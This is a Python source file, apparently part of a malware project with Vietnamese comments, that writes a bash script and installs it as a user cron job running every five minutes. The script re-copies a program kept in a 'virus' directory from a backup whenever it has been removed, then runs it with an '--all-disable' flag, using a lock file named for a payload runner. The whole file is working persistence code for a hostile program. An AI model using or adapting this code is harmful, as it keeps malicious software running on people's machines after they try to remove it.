import subprocess
import os
import hashlib
from config import SAVE_VIRUS_DIR, BACKUP_DIR, CRON_DIR, BASH_SCRIPT_NAME, LIST_NEW_FILES

def create_bash_content(progFileName: str, progFileBackup: str) -> str:
    """
    Creates a bash script to be used in cron job
    """

    dirSaveVirus = os.path.expanduser(SAVE_VIRUS_DIR)
    backupDir = os.path.expanduser(BACKUP_DIR)

    bash_content = f"""
    #!/usr/bin/env bash
    set -euo pipefail
    
    export DISPLAY=:0
    export XDG_RUNTIME_DIR=/run/user/1000
    export DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
    
    PROG="{dirSaveVirus}/{progFileName}"
    BACKUP="{backupDir}/{progFileBackup}"
    
    LOCKFILE="/tmp/payload-cron-runner.lock"
    
    # tránh chạy đồng thời
    (
      flock -n 9 || exit 0
    
      if [ ! -x "$PROG" ] && [ -f "$BACKUP" ]; then
        cp -a -- "$BACKUP" "$PROG"
        chmod +x -- "$PROG" || true
      fi
    
      # Chạy chương trình nếu có thể
      if [ -x "$PROG" ]; then
        cd "$HOME" || true
        exec "$PROG" --all-disable
      fi
    
    ) 9>"$LOCKFILE"

"""
    return bash_content

def check_sum_bash_content(bash_content: str) -> str:
    h = hashlib.md5()
    h.update(bash_content.encode('utf-8'))
    return h.hexdigest()

def install_cron_job(bash_content: str, interval_minutes: int = 5) -> bool:
    """
    Install a cron job to run the bash script every interval_minutes
    """
    cron_dir = os.path.expanduser(CRON_DIR)

    bash_path = os.path.join(cron_dir, BASH_SCRIPT_NAME)

    # Check if the file exists and the content has not changed then do nothing
    if os.path.exists(bash_path):
        with open(bash_path, "r") as f:
            existing_content = f.read()
        if check_sum_bash_content(existing_content) == check_sum_bash_content(bash_content):
            print("Bash script already exists and is up to date.")
            return True
    try:
        # Write bash script
        print(f"Creating bash script: {bash_path}")
        with open(bash_path, "w") as f:
            f.write(bash_content)
        os.chmod(bash_path, 0o755)
        LIST_NEW_FILES.append(bash_path)
    except Exception as e:
        print(f"Error writing bash script {bash_path}: {e}")
        return False

    cron_job = f"*/{interval_minutes} * * * * {bash_path}\n"
    try:
        # Check if the cron job already exists
        existing_cron = subprocess.run(["crontab", "-l"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        if cron_job in existing_cron.stdout:
            print("Cron job already exists.")
            return True

        # Add the new cron job
        new_cron = existing_cron.stdout + cron_job
        process = subprocess.Popen(["crontab"], stdin=subprocess.PIPE, universal_newlines=True)
        process.communicate(new_cron)
        if process.returncode != 0:
            print("Error installing cron job.")
            return False
    except Exception as e:
        print(f"Error installing cron job: {e}")
        return False

    return True